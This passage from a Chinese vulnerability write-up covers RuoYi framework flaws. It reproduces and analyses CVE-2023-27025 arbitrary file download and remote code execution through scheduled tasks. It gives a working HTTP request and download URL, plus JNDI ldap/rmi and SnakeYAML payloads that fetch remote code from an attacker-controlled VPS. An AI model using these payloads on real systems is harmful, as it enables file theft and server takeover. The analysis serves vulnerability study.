title="漏洞分析"></a>漏洞分析</h3><p>下面即为相应文件下载接口的处理函数；这个文件下载接口是通过获取<code>profile</code>变量的内容拼接<code>resource</code>参数中<code>/profile</code>后的内容进行的文件下载。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 本地资源通用下载</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@GetMapping(&quot;/common/download/resource&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resourceDownload</span><span class="hljs-params">(String resource, HttpServletRequest request, HttpServletResponse response)</span><br>        <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-comment">// 本地资源路径</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">localPath</span> <span class="hljs-operator">=</span> Global.getProfile();<br>    <span class="hljs-comment">// 数据库资源地址</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">downloadPath</span> <span class="hljs-operator">=</span> localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);<br>    <span class="hljs-comment">// 下载名称</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">downloadName</span> <span class="hljs-operator">=</span> StringUtils.substringAfterLast(downloadPath, <span class="hljs-string">&quot;/&quot;</span>);<br>    response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);<br>    FileUtils.setAttachmentResponseHeader(response, downloadName);<br>    FileUtils.writeBytes(downloadPath, response.getOutputStream());<br>&#125;<br></code></pre></td></tr></table></figure><p>由于该函数并没有对<code>resource</code>参数的内容进行任何过滤，因此会非常容易导致目录穿越等漏洞的产生；</p><p>这里也是没有过滤，所以通过目录穿越也是能够实现任意文件下载；</p><h2 id="3-2-CVE-2023-27025-若依任意文件下载（"><a href="#3-2-CVE-2023-27025-若依任意文件下载（" class="headerlink" title="3.2 CVE-2023-27025 若依任意文件下载（&lt;V4.7.7）"></a>3.2 CVE-2023-27025 若依任意文件下载（&lt;V4.7.7）</h2><h3 id="漏洞复现-10"><a href="#漏洞复现-10" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>首先通过定时任务执行<code>setProfile</code>函数修改<code>profile</code>设置的内容</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/monitor/job/add</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.10<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>204<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.10<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.10/monitor/job/add<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=63249f2e-0323-46b5-a29f-29be13153080<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-apache"><span class="hljs-attribute">createBy</span>=admin&amp;jobName=CVE-<span class="hljs-number">2023</span>-<span class="hljs-number">27025</span>&amp;jobGroup=DEFAULT&amp;invokeTarget=ruoYiConfig.setProfile(&#x27;C%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>FWindows%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Fwin.ini&#x27;)&amp;cronExpression=<span class="hljs-number">0</span>%<span class="hljs-number">2</span>F10+*+*+*+*+%<span class="hljs-number">3</span>F&amp;misfirePolicy=<span class="hljs-number">1</span>&amp;concurrent=<span class="hljs-number">1</span>&amp;status=<span class="hljs-number">0</span>&amp;remark=</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754666886695-bd88f07f-acaf-40df-907a-f675045d5795.png"></p><p>执行一次定时任务修改<code>profile</code>设置的值；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754666961529-228372c3-032f-45ab-ab2a-f1f1017f24d6.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754667007773-9703bbba-475d-4a93-921f-f10eacd595fe.png"></p><p>通过调度日志可以确定执行成功；然后访问(文件名随意，不以<code>/profile</code>开头即可)</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://192.168.1.10/common/download/resource?resource=info.xml:.zip<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754667141682-b2e2e4a6-1a20-454b-a0c8-4843a1f5e6ee.png"></p><p>通过定时任务修改为任意路径的文件即可做到下载任意文件；</p><h3 id="漏洞分析-10"><a href="#漏洞分析-10" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>通过分析该接口的函数可以发现，这个文件下载接口是通过获取<code>profile</code>变量的内容拼接<code>resource</code>参数中<code>/profile</code>后的内容进行的文件下载。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 本地资源通用下载</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@GetMapping(&quot;/common/download/resource&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resourceDownload</span><span class="hljs-params">(String resource, HttpServletRequest request, HttpServletResponse response)</span><br>        <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-keyword">try</span><br>    &#123;<br>        <span class="hljs-comment">// 禁止目录穿越（过滤..）；文件名后缀白名单过滤；</span><br>        <span class="hljs-keyword">if</span> (!FileUtils.checkAllowDownload(resource))<br>        &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exception</span>(StringUtils.format(<span class="hljs-string">&quot;资源文件(&#123;&#125;)非法，不允许下载。 &quot;</span>, resource));<br>        &#125;<br>        <span class="hljs-comment">// 本地资源路径（在RuoYi-4.6.0/ruoyi-admin/src/main/resources/application.yml配置）</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">localPath</span> <span class="hljs-operator">=</span> RuoYiConfig.getProfile();<br>        <span class="hljs-comment">// 数据库资源地址</span><br>        <span class="hljs-comment">// localPath 拼接resource参数中/profile后面的内容</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">downloadPath</span> <span class="hljs-operator">=</span> localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);<br>        <span class="hljs-comment">// 下载名称，获取下载文件名</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">downloadName</span> <span class="hljs-operator">=</span> StringUtils.substringAfterLast(downloadPath, <span class="hljs-string">&quot;/&quot;</span>);<br>        response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);<br>        FileUtils.setAttachmentResponseHeader(response, downloadName);<br>        FileUtils.writeBytes(downloadPath, response.getOutputStream());<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (Exception e)<br>    &#123;<br>        log.error(<span class="hljs-string">&quot;下载文件失败&quot;</span>, e);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于<code>resource</code>参数已经经过了白名单和目录穿越的过滤，比较难实现任意文件下载；</p><p>又由于该函数处理的是拼接<code>resource</code>内容中<code>/profile</code>后的内容，如果<code>resource</code>中不包含<code>/profile</code>，那么拼接的内容不就是<code>null</code>了吗？这时如果我们能够自定义<code>profile</code>变量的值，那么我们也可以实现任意文件下载；</p><p>虽然没有直接性的接口能够实现自定义<code>profile</code>变量，但是若依框架中存在定时任务，该任务可以调用除过滤方法以外的任意函数和传入任意参数；</p><p>在框架源码中寻找，发现存在设置<code>profile</code>变量的函数位于</p><p><code>RuoYi-4.6.0/ruoyi-common/src/main/java/com/ruoyi/common/config/RuoYiConfig.java#setProfile</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setProfile</span><span class="hljs-params">(String profile)</span><br>&#123;<br>    RuoYiConfig.profile = profile;<br>&#125;<br></code></pre></td></tr></table></figure><p>因此，通过设置定时任务<code>ruoYiConfig.setProfile(&#39;C://Windows//win.ini&#39;)</code>执行，将<code>profile</code>变量设置为想要下载的文件的绝对路径；</p><p>然后调用接口<code>/common/download/resource</code>，参数<code>resource</code>传入不含<code>/profile</code>的白名单后缀文件记录下载<code>profile</code>定义的绝对路径文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">http:<span class="hljs-comment">//192.168.1.10/common/download/resource?resource=info.xml:.zip</span><br></code></pre></td></tr></table></figure><h1 id="4-定时任务-RCE"><a href="#4-定时任务-RCE" class="headerlink" title="4 定时任务 RCE"></a>4 定时任务 RCE</h1><h2 id="4-1-定时任务-RCE（"><a href="#4-1-定时任务-RCE（" class="headerlink" title="4.1 定时任务 RCE（&lt;V4.6.2）"></a>4.1 定时任务 RCE（&lt;V4.6.2）</h2><h3 id="漏洞复现-11"><a href="#漏洞复现-11" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>对于该定时任务 RCE 漏洞需要注意，启动若依的 jdk 版本必须位于 jdk1.8.0-191 以下，因为大于 191 版本的 jdk1.8 已经禁止了远程 ldap 请求，所以无法远程 rce，只能本地复现。</p><p>这里采用的复现环境是 jdk1.8.0_121 + ruoyi V4.6.0，采用的是请求 VPS ip 起的 ldap；</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">javax.naming.InitialContext.lookup(<span class="hljs-string">&#x27;ldap://xx.xxx.xx.xxx:1389/Basic/Command/calc.exe&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754654352580-5e038b62-0132-4fed-9e13-3c5ef587f561.png"></p><p>这里需要注意，服务器中启动 LDAP 服务的 java 版本要求是 jdk8；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754654456752-9d7bb9c0-028d-4c3c-b31f-ba1b64bfaa89.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754654483267-03ffc344-abec-4723-80c0-d0dce906a77b.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754655349280-dd40bebb-f5f5-45d0-89c7-f1a46edb505c.png"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754654521131-bae3195c-0cf3-477c-a4b8-2c4e0ab3b61f.png"></p><p>在 V4.6.2 以下的版本是没有进行任何过滤的，所以基本上使用任何方法都能够实现 RCE；</p><p>虽然在 V4.6.2 中仅用了 rmi 的远程调用，但是这丝毫不会影响 ldap 的远程调用，依旧随便 RCE；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">org.springframework.jndi.JndiLocatorDelegate.lookup(<span class="hljs-string">&#x27;rmi://xx.xxx.xx.xxx:1389/Calc&#x27;</span>)<br>javax.naming.InitialContext.lookup(<span class="hljs-string">&#x27;ldap://xx.xxx.xx.xxx:1389/Basic/Command/calc.exe&#x27;</span>)<br>org.yaml.snakeyaml.Yaml.load(<span class="hljs-string">&#x27;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://xx.xx.xxx.xx:1389/yaml-payload.jar&quot;]]]]&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="漏洞分析-11"><a href="#漏洞分析-11" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>添加定时任务接口对应的处理函数<code>RuoYi-4.6.0/ruoyi-admin/src/main/java/com/ruoyi/web/controller/system/SysDeptController.java#addSave</code></p><p>在 4.6.2 版本以前没有对定时任务做任何过滤，因此可以实现多种方式的命令执行；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 新增保存调度</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Log(title = &quot;定时任务&quot;, businessType = BusinessType.INSERT)</span><br><span class="hljs-meta">@RequiresPermissions(&quot;monitor:job:add&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/add&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> AjaxResult <span class="hljs-title function_">addSave</span><span class="hljs-params">(<span class="hljs-meta">@Validated</span> SysJob job)</span> <span class="hljs-keyword">throws</span> SchedulerException, TaskException<br>&#123;<br>    <span class="hljs-keyword">if</span> (!CronUtils.isValid(job.getCronExpression()))<br>    &#123;<br>        <span class="hljs-keyword">return</span> AjaxResult.error(<span class="hljs-string">&quot;cron表达式不正确&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> toAjax(jobService.insertJob(job));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 新增任务</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> job 调度信息 调度信息</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Transactional</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">insertJob</span><span class="hljs-params">(SysJob job)</span> <span class="hljs-keyword">throws</span> SchedulerException, TaskException<br>&#123;<br>    job.setStatus(ScheduleConstants.Status.PAUSE.getValue());<br>    <span class="hljs-type">int</span> <span class="hljs-variable">rows</span> <span class="hljs-operator">=</span> jobMapper.insertJob(job);<br>    <span class="hljs-keyword">if</span> (rows &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-comment">// 创建定时任务</span><br>        ScheduleUtils.createScheduleJob(scheduler, job);<br>    &#125;<br>    <span class="hljs-keyword">return</span> rows;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 创建定时任务</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createScheduleJob</span><span class="hljs-params">(Scheduler scheduler, SysJob job)</span> <span class="hljs-keyword">throws</span> SchedulerException, TaskException<br>&#123;<br>    <span class="hljs-comment">// 定时任务处理类获取</span><br>    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Job</span>&gt; jobClass = getQuartzJobClass(job);<br>    <span class="hljs-comment">// 构建job信息</span><br>    <span class="hljs-type">Long</span> <span class="hljs-variable">jobId</span> <span class="hljs-operator">=</span> job.getJobId();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">jobGroup</span> <span class="hljs-operator">=</span> job.getJobGroup();<br>    <span class="hljs-comment">// 新建定时任务，处理类为QuartzJobExecution/QuartzDisallowConcurrentExecution</span><br>    <span class="hljs-type">JobDetail</span> <span class="hljs-variable">jobDetail</span> <span class="hljs-operator">=</span> JobBuilder.newJob(jobClass).withIdentity(getJobKey(jobId, jobGroup)).build();<br>    <span class="hljs-comment">// 表达式调度构建器</span><br>    <span class="hljs-type">CronScheduleBuilder</span> <span class="hljs-variable">cronScheduleBuilder</span> <span class="hljs-operator">=</span> CronScheduleBuilder.cronSchedule(job.getCronExpression());<br>    cronScheduleBuilder = handleCronScheduleMisfirePolicy(job, cronScheduleBuilder);<br>    <span class="hljs-comment">// 按新的cronExpression表达式构建一个新的trigger</span><br>    <span class="hljs-type">CronTrigger</span> <span class="hljs-variable">trigger</span> <span class="hljs-operator">=</span> TriggerBuilder.newTrigger().withIdentity(getTriggerKey(jobId, jobGroup))<br>            .withSchedule(cronScheduleBuilder).build();<br>    <span class="hljs-comment">// 放入参数，运行时的方法可以获取</span><br>    jobDetail.getJobDataMap().put(ScheduleConstants.TASK_PROPERTIES, job);<br>    <span class="hljs-comment">// 判断是否存在</span><br>    <span class="hljs-keyword">if</span> (scheduler.checkExists(getJobKey(jobId, jobGroup)))<br>    &#123;<br>        <span class="hljs-comment">// 防止创建时存在数据问题 先移除，然后在执行创建操作</span><br>        scheduler.deleteJob(getJobKey(jobId, jobGroup));<br>    &#125;<br>    scheduler.scheduleJob(jobDetail, trigger);<br>    <span class="hljs-comment">// 暂停任务</span><br>    <span class="hljs-keyword">if</span> (job.getStatus().equals(ScheduleConstants.Status.PAUSE.getValue()))<br>    &#123;<br>        scheduler.pauseJob(ScheduleUtils.getJobKey(jobId, jobGroup));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在此之前的代码已经实现了定时任务的创建，并设置了定时任务的处理函数为<code>RuoYi-4.6.0/ruoyi-quartz/src/main/java/com/ruoyi/quartz/util/QuartzJobExecution.java#doExecute</code></p><p>下面是执行定时任务方法的流程；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 任务调度立即执行一次</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Log(title = &quot;定时任务&quot;, businessType = BusinessType.UPDATE)</span><br><span class="hljs-meta">@RequiresPermissions(&quot;monitor:job:changeStatus&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/run&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> AjaxResult <span class="hljs-title function_">run</span><span class="hljs-params">(SysJob job)</span> <span class="hljs-keyword">throws</span> SchedulerException<br>&#123;<br>    jobService.run(job);<br>    <span class="hljs-keyword">return</span> success();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 立即运行任务</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> job 调度信息</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Transactional</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(SysJob job)</span> <span class="hljs-keyword">throws</span> SchedulerException<br>&#123;<br>    <span class="hljs-type">Long</span> <span class="hljs-variable">jobId</span> <span class="hljs-operator">=</span> job.getJobId();<br>    <span class="hljs-type">SysJob</span> <span class="hljs-variable">tmpObj</span> <span class="hljs-operator">=</span> selectJobById(job.getJobId());<br>    <span class="hljs-comment">// 参数</span><br>    <span class="hljs-type">JobDataMap</span> <span class="hljs-variable">dataMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JobDataMap</span>();<br>    dataMap.put(ScheduleConstants.TASK_PROPERTIES, tmpObj);<br>    <span class="hljs-comment">// 这里开始调用定时任务处理函数</span><br>    scheduler.triggerJob(ScheduleUtils.getJobKey(jobId, tmpObj.getJobGroup()), dataMap);<br>&#125;<br></code></pre></td></tr></table></figure><p>位于<code>RuoYi-4.6.0/ruoyi-quartz/src/main/java/com/ruoyi/quartz/util/QuartzJobExecution.java</code>，执行<code>doExecute</code>函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 定时任务处理（允许并发执行）</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ruoyi</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">QuartzJobExecution</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQuartzJob</span><br>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doExecute</span><span class="hljs-params">(JobExecutionContext context, SysJob sysJob)</span> <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br>        JobInvokeUtil.invokeMethod(sysJob);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>判断执行的目标名称是否为<code>bean</code>，根据相应类型进行执行方法调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 执行方法</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> sysJob 系统任务</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeMethod</span><span class="hljs-params">(SysJob sysJob)</span> <span class="hljs-keyword">throws</span> Exception<br>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">invokeTarget</span> <span class="hljs-operator">=</span> sysJob.getInvokeTarget();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">beanName</span> <span class="hljs-operator">=</span> getBeanName(invokeTarget);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> getMethodName(invokeTarget);<br>    List&lt;Object[]&gt; methodParams = getMethodParams(invokeTarget);<br>    <span class="hljs-keyword">if</span> (!isValidClassName(beanName))<br>    &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> SpringUtils.getBean(beanName);<br>        invokeMethod(bean, methodName, methodParams);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> Class.forName(beanName).newInstance();<br>        invokeMethod(bean, methodName, methodParams);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>反射调用相应类对应的函数；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 调用任务方法</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> bean 目标对象</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> methodName 方法名称</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> methodParams 方法参数</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeMethod</span><span class="hljs-params">(Object bean, String methodName, List&lt;Object[]&gt; methodParams)</span><br>        <span class="hljs-keyword">throws</span> NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException,<br>        InvocationTargetException<br>&#123;<br>    <span class="hljs-keyword">if</span> (StringUtils.isNotNull(methodParams) &amp;&amp; methodParams.size() &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> bean.getClass().getDeclaredMethod(methodName, getMethodParamsType(methodParams));<br>        method.invoke(bean, getMethodParamsValue(methodParams));<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> bean.getClass().getDeclaredMethod(methodName);<br>        method.invoke(bean);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上就是定时任务添加和调用的全流程，在 4.6.2 